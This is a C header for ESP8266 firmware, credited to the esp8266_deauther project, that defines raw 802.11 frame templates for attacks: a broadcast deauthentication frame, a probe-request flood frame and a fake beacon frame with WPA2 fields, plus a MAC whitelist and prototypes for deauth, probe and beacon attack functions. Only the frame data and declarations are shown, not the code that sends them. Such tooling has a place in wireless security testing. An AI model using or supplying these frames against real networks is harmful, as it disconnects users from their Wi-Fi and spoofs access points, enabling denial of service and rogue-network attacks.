#ifndef _USER_ATTACK_H
#define _USER_ATTACK_H

/**
 * Attack foundations from:
 *
 * https://github.com/spacehuhn/esp8266_deauther/tree/master/esp8266_deauther
 */

uint8_t deauth_packet[26] = {
    /*  0 - 1  */ 0xC0, 0x00,                                       // type, subtype c0: deauth (a0: disassociate)
    /*  2 - 3  */ 0x00, 0x00,                                       // duration (SDK takes care of that)
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,               // reciever (target)
    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,               // source (ap)
    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,               // BSSID (ap)
    /* 22 - 23 */ 0x00, 0x00,                                       // fragment & squence number
    /* 24 - 25 */ 0x01, 0x00                                        // reason code (1 = unspecified reason)
};

uint8_t probe_packet[68] = {
    /*  0 - 1  */ 0x40, 0x00,                                       // Type: Probe Request
    /*  2 - 3  */ 0x00, 0x00,                                       // Duration: 0 microseconds
    /*  4 - 9  */ 0xff, 0xff,               0xff, 0xff, 0xff, 0xff, // Destination: Broadcast
    /* 10 - 15 */ 0xAA, 0xAA,               0xAA, 0xAA, 0xAA, 0xAA, // Source: random MAC
    /* 16 - 21 */ 0xff, 0xff,               0xff, 0xff, 0xff, 0xff, // BSS Id: Broadcast
    /* 22 - 23 */ 0x00, 0x00,                                       // Sequence number (will be replaced by the SDK)
    /* 24 - 25 */ 0x00, 0x20,                                       // Tag: Set SSID length, Tag length: 32
    /* 26 - 57 */ 0x20, 0x20,               0x20, 0x20,             // SSID
    0x20,               0x20,               0x20, 0x20,
    0x20,               0x20,               0x20, 0x20,
    0x20,               0x20,               0x20, 0x20,
    0x20,               0x20,               0x20, 0x20,
    0x20,               0x20,               0x20, 0x20,
    0x20,               0x20,               0x20, 0x20,
    0x20,               0x20,               0x20, 0x20,
    /* 58 - 59 */ 0x01, 0x08, // Tag Number: Supported Rates (1), Tag length: 8
    /* 60 */ 0x82,            // 1(B)
    /* 61 */ 0x84,            // 2(B)
    /* 62 */ 0x8b,            // 5.5(B)
    /* 63 */ 0x96,            // 11(B)
    /* 64 */ 0x24,            // 18
    /* 65 */ 0x30,            // 24
    /* 66 */ 0x48,            // 36
    /* 67 */ 0x6c             // 54
};

uint8_t beacon_packet[109] = {
    /*  0 - 3  */ 0x80,   0x00, 0x00, 0x00,                         // Type/Subtype: managment beacon frame
    /*  4 - 9  */ 0xFF,   0xFF, 0xFF, 0xFF, 0xFF, 0xFF,             // Destination: broadcast
    /* 10 - 15 */ 0x01,   0x02, 0x03, 0x04, 0x05, 0x06,             // Source
    /* 16 - 21 */ 0x01,   0x02, 0x03, 0x04, 0x05, 0x06,             // Source

    // Fixed parameters
    /* 22 - 23 */ 0x00,   0x00,                                     // Fragment & sequence number (will be done by the SDK)
    /* 24 - 31 */ 0x83,   0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
    /* 32 - 33 */ 0xe8,   0x03,                                     // Interval: 0x64, 0x00 => every 100ms - 0xe8, 0x03 => every 1s
    /* 34 - 35 */ 0x31,   0x00,                                     // capabilities Tnformation

    // Tagged parameters

    // SSID parameters
    /* 36 - 37 */ 0x00,   0x20, // Tag: Set SSID length, Tag length: 32
    /* 38 - 69 */ 0x20,   0x20, 0x20, 0x20,
    0x20,                 0x20, 0x20, 0x20,
    0x20,                 0x20, 0x20, 0x20,
    0x20,                 0x20, 0x20, 0x20,
    0x20,                 0x20, 0x20, 0x20,
    0x20,                 0x20, 0x20, 0x20,
    0x20,                 0x20, 0x20, 0x20,
    0x20,                 0x20, 0x20, 0x20, // SSID

    // Supported Rates
    /* 70 - 71 */ 0x01,   0x08,             // Tag: Supported Rates, Tag length: 8
    /* 72 */ 0x82,                          // 1(B)
    /* 73 */ 0x84,                          // 2(B)
    /* 74 */ 0x8b,                          // 5.5(B)
    /* 75 */ 0x96,                          // 11(B)
    /* 76 */ 0x24,                          // 18
    /* 77 */ 0x30,                          // 24
    /* 78 */ 0x48,                          // 36
    /* 79 */ 0x6c,                          // 54

    // Current Channel
    /* 80 - 81 */ 0x03,   0x01,             // Channel set, length
    /* 82 */ 0x01,                          // Current Channel

    // RSN information
    /*  83 -  84 */ 0x30, 0x18,
    /*  85 -  86 */ 0x01, 0x00,
    /*  87 -  90 */ 0x00, 0x0f, 0xac, 0x02,
    /*  91 -  92 */ 0x02, 0x00,
    /*  93 - 100 */ 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04,
    /* 101 - 102 */ 0x01, 0x00,
    /* 103 - 106 */ 0x00, 0x0f, 0xac, 0x02,
    /* 107 - 108 */ 0x00, 0x00
};

uint8_t macs_white_list[2][MAC_ADDR_LEN] =
{
    { 0x77, 0xEA, 0x3A, 0x8D, 0xA7, 0xC8 },
    { 0x40, 0x65, 0xA4, 0xE0, 0x24, 0xDF }
};

bool user_attack_deauth(uint8_t* ap_mac, uint8_t* client_mac, uint8_t reason, uint8_t channel);
bool user_attack_probe(const char* ssid, uint8_t channel);
bool user_attack_beacon(uint8_t* mac, const char* ssid, uint8_t channel, bool wpa2);

#endif